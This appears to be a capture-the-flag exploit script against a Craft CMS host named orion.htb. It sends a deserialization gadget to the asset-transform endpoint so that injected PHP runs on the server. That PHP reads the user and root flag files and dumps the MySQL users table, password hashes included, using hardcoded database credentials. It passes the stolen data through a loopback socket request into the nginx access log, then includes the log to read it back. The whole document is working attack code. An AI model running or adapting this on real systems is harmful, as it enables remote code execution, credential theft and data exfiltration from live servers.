import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    filt = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":filt}]}}}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers={'Content-Type':'application/json','X-CSRF-Token':tok}, timeout=15)

# Step 1: Use PHP fsockopen to make a loopback request with data
# This avoids needing curl/wget - just raw TCP to localhost:80
php1 = '<?php ' \
    '# Read flags ' \
    '$user_flag = @file_get_contents("/home/adam/user.txt"); ' \
    '$root_flag = @file_get_contents("/root/root.txt"); ' \
    '$data = "UF=" . urlencode(substr($user_flag ?: "NOUF", 0, 100)) . "&RF=" . urlencode(substr($root_flag ?: "NORF", 0, 100)); ' \
    '# Also get the MySQL users table data ' \
    'try { ' \
    '  $db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); ' \
    '  $users = $db->query("SELECT id, username, email, password, admin, locked FROM users")->fetchAll(PDO::FETCH_ASSOC); ' \
    '  $data .= "&USR=" . urlencode(json_encode($users)); ' \
    '} catch (Exception $e) { ' \
    '  $data .= "&DBERR=" . urlencode($e->getMessage()); ' \
    '} ' \
    '# Send via raw socket to localhost ' \
    '$sock = @fsockopen("127.0.0.1", 80, $eno, $err, 5); ' \
    'if ($sock) { ' \
    '  $req = "GET /index.php?$data HTTP/1.0\r\nHost: orion.htb\r\nConnection: close\r\n\r\n"; ' \
    '  fwrite($sock, $req); ' \
    '  $resp = stream_get_contents($sock); ' \
    '  fclose($sock); ' \
    '  file_put_contents("/dev/shm/socket_response.txt", substr($resp, 0, 1000)); ' \
    '  file_put_contents("/dev/shm/socket_ok.txt", "SOCKET_OK"); ' \
    '} else { ' \
    '  file_put_contents("/dev/shm/socket_err.txt", "err=$eno $err"); ' \
    '}'

print("[*] Step 1: Reading flags and sending via socket loopback ...")
r = inject_b64(php1)
print(f"    Status: {r.status_code}")
time.sleep(2)

# Step 2: Check if socket worked - try to see the loopback request in access.log
# Touch to invalidate opcache
php_touch = '<?php @touch("/var/log/nginx/access.log"); @opcache_invalidate("/var/log/nginx/access.log", true);'
print("[*] Step 2: Touching access.log ...")
inject_b64(php_touch)
time.sleep(1)

# Include access.log
print("[*] Step 3: Reading access.log ...")
s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/var/log/nginx/access.log"}]}}}
r3 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers={'Content-Type':'application/json','X-CSRF-Token':tok}, timeout=30)

print(f"    Status: {r3.status_code}, Len: {len(r3.text)}")
t = r3.text

# Search for our data in the access.log output
for kw in ['UF=', 'RF=', 'USR=', 'DBERR', 'SOCKET_OK', 'NOUF', 'NORF']:
    if kw in t:
        idx = t.index(kw)
        print(f'[+] FOUND "{kw}" at byte {idx}')
        end = min(idx + 300, len(t))
        print(f'    Data: {t[idx:end]}')

# Also check the end of the file (most recent entries)
print(f'\n--- Last 1500 chars ---')
print(t[-1500:])
